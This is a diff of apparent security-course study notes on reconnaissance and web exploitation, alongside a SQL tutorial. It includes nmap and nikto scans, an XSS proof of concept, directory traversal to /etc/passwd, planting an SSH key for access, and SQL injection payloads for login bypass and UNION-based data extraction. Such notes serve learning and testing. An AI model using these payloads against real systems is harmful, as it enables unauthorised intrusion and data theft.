@@ -1,10 +1,14 @@
 SCANNING AND RECON
 
-    Python Scrapping - data collection 
+    Python Scrapping - data collection https://towardsdatascience.com/how-to-use-python-and-xpath-to-scrape-websites-99eaed73f1dd
         sudo apt install python3-pip
         sudo pip3 install lxml
         sudo pip3 install requests
 
+        ex.) scrape authors from
+        <h2 class="text-white mb-4 name" data-aos="fade-right" data-aos-delay="200">Aaron Thomas</h2>
+            
+            authors = tree.xpath('//h2[@class="text-white mb-4 name"]/text()')
 
         from python terminal:
             import lxml.html #parse html
@@ -21,6 +25,179 @@ SCANNING AND RECON
         Host Interrogation
             nc -v <ip> <port> #banner grab
             nmap -sV <ip> <port>
-
             nikto -h <ip> -p <port> #open source vuln scan
+
     NMAP scripting engine (NSE) #/usr/share/nmap/scripts/
+        nmap --script http-enum.nse <ip> #basic enumeration
+        sudo nmap --traceroute --script traceroute-geolocation.nse -p 80 172.20.20.81 # traceroute, geolocation
+        nmap -p 445 -Pn --script smb-os-discovery 172.20.25.215 #os discovery using 445(smb)
+
+    Web Server Recon
+        Nikto
+        bannergrab w/ nc/nmap
+        nmap nse scripts:
+            http-enum
+                nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
+            http-sql-injection
+                nmap -Pn -T5 -sT -p 80 --script http-sql-inection.nse <IP>
+            http-robots.txt
+                might miss stuff. check manually
+
+WEB EXPLOITATION - look for robots.txt
+    Apache serves HTML/CSS from /var/www/html # traditionally runs LAMP (apache, mysql, php) stack
+        GET - information will be in the URL #http://website.com/form.php?field1=words
+        POST - data is inside message body (bytes)
+        DELETE
+
+        Can run PHP - backend scripting language
+        MySQL - relational backend database
+
+    HTML
+    JAVASCRIPT
+        within <script> </script> tags
+    CURL - 
+        curl -o stuff.html http://website/stuff.html
+        curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+
+    XSS
+        Reflected XSS - links
+            characters usually illegal in URLs can be base64 encoded
+                http://example.com/page.php?name=dXNlcjEyMw%3D%3D
+        Stored XSS - resides on site (iframe). only requires user to visit page
+            Proof of concept to see is XSS works:
+                <script>alert('XSS')</script>
+
+    upload ssh key
+        make .ssh file
+        add public key to .ssh
+            touch /var/www/.ssh/authorized_keys
+            echo "the public key" > authorized_keys
+        can authenticate using private key
+        ssh -i <private> <host@ip> 
+    Server-side injection (directory traversal) - ability to read/execute outside web servers dir
+        uses ../../  paths
+        ex.     ../../../../../../../etc/passwd
+        
+SQL 
+
+    Table - entity
+    Rows - instances
+    Columns - properties
+
+    Query
+        SELECT <column property> FROM <table> #returns all columns of specified property
+
+        WHERE clause #filter to just some rows of a column
+            SELECT * FROM <table> WHERE id = 6; #select all columns from table where the id column = 6
+
+            String Operators:
+                = or !=             - case sensitive exact string compare
+                LIKE or NOT LIKE    - case insensitive exact string compare
+                    EX.     SELECT * FROM movies WHERE Title LIKE "%Toy%" ;
+
+                %                   - use anywhere in string to match zero or more characters (only w/ LIKE or NOT LIKE
+                    EX.     <column> LIKE "%AT%"        #matches "AT", "ATTIC", "CAT", "BATS"...
+
+                _ (underscore)      - use anywhere in str to match single char (only w/ LIKE or NOT LIKE)
+                    EX.     <column> LIKE "AN_"         #matches "AND" but not "AN"
+
+                IN (...) NOT IN (...)- str exists in a list
+                    EX.     <column> IN ("A", "B", "C")
+
+        DISTINCT - show uniq columns
+            SELECT DISTINCT <column>
+            FROM <table>
+
+
+        Ordering results (ORDER BY) - each row of results are sorted alpha-numerically
+            SELECT <column>, ...
+            FROM <table>
+            WHERE <conditions>
+            ORDER BY <column> <ASC/DESC>
+        
+        LIMIT/OFFSET (show a subset of results)
+            SELECT <column>, ...
+            FROM <table>
+            WHERE <conditions>
+            ORDER BY <column> <ASC/DESC>
+            LIMIT 4 OFFSET 0 #show 4 starting from first (0th) element
+
+
+        INNER JOIN - match rows from 1st tasble and 2nd table which have same key
+            SELECT column, another_table_column, …
+            FROM mytable
+            INNER JOIN another_table 
+                ON mytable.<column> = another_table.<column>
+        
+        LEFT/RIGHT/INNER JOIN VISUAL REPRESENTATION https://www.codeproject.com/Articles/33052/Visual-Representation-of-SQL-Joins
+
+
+        NULL values
+            WHERE <column> IS/IS NOT NULL
+        
+        Expressions
+            SELECT col_expression AS expr_description, …    #AS is just a description
+            FROM mytable;
+        
+        Aggregates
+            SELECT role, AVG(years_employed) as Average_years_employed
+            FROM employees
+            GROUP BY role; #show avg years employed for each role of employee
+
+        HAVING - written same as WHERE clause. used after GROUP BY to filter down
+            SELECT group_by_column, AGG_FUNC(column_expression) AS aggregate_result_alias, …
+            FROM mytable
+            WHERE condition
+            GROUP BY column
+            HAVING group_condition;
+
+SQL INJECTION
+    information_schema database - names for columns, tables...
+    Unsanitized - ' closes variable
+    Username and Password ex
+        User:       tom' OR 1='1
+        Pass:       tom' OR 1='1
+            server side looks like       SELECT id FROM users WHERE name='tom' OR 1='1' AND pass='tom' OR 1='1'
+
+    Ignore rest - use # or --
+        
+    Selection=2 Union select table_schema,table_name,3 from information_schema.tables
+
+    Database schemas
+
+    after php:     
+        1.) Selection=2 Union select 1, table_name, 3 from information_schema.tables
+        2.) Selection=2 Union select table_schema,table_name, null from information_schema.tables
+                <database name> <table name>
+        3.) Selection=2 Union select table_name,null,column_name from information_schema.columns
+                shows column properties of tables
+        4.) Seleciton=2 Union select name,cost,null from Tires
+                pull back relevant info
+    
+    through text box
+        Audi' union select table_name,null,table_schema,4,5 from information_schema.tables #
+            uses Audi table which is prone to sql injection
+
+        Audi' union select table_name,null,column_name,4,5 from information_schema.columns #
+            show column properties
+        Audi' union select type,null,carid,cost,year from car #
+            pull back relevant info
+
+        Audi' union select @@version,null,database(),null,null from session.Tires #
+            session is the database name, Tires is the table
+
+    
+
+
+
+
+
+
+
+
+
+
+
+            
+
+
